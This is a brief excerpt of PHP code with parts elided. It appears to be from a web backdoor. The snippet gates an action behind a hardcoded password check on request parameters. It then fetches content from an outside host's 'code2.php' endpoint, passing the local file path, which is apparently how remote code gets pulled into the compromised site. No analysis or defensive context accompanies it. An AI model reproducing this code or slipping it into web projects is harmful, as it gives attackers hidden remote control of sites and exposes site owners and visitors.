...
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'a74105c6d790ee9d06a82cbcabbd4043'))
	{
...
if($tmpcontent = @file_get_contents("http://www.dolsh.com/code2.php?i=".$path))
{
